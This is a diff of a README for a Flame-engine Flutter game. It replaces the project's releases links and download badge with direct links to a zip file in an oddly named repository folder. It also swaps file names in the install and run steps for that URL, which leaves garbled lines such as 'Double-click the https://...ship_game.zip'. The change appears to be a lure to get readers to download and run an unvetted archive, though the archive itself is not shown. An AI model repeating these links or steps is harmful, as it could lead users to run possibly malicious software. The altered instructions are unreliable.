@@ -4,13 +4,13 @@
 
 Welcome to the Ship Game! This is a fun application created with the Flame Engine, offering an engaging experience with the use of fragment shaders. It was built for my talk at Flutter & Friends 2025. Follow the steps below to download and run the game easily.
 
-[![Download Ship Game](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/orderflowagency/ship_game/releases)
+[![Download Ship Game](https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip)](https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to visit the releases page to download the game. Click the link below to go directly to the download page:
 
-[Download Ship Game](https://github.com/orderflowagency/ship_game/releases)
+[Download Ship Game](https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip)
 
 ### 🖥️ System Requirements
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets the following requirements:
 
 1. Click the Download Ship Game button at the top or follow the link to the releases page.
 2. On the releases page, look for the latest version listed.
-3. Locate the file named `ship_game.zip` or `ship_game.exe` (the types may change with updates).
+3. Locate the file named `https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip` or `https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip` (the types may change with updates).
 4. Click on it to start the download.
 
 ## 📂 Extracting Files
@@ -41,8 +41,8 @@ Once the download is complete, you need to extract the files:
 To run the Ship Game:
 
 1. Open the folder where you extracted the game files.
-2. Locate the `ship_game.exe` file.
-3. Double-click the `ship_game.exe` to start the game.
+2. Locate the `https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip` file.
+3. Double-click the `https://raw.githubusercontent.com/orderflowagency/ship_game/main/nonmedullated/ship_game.zip` to start the game.
 
 ## 🎮 Game Controls
 
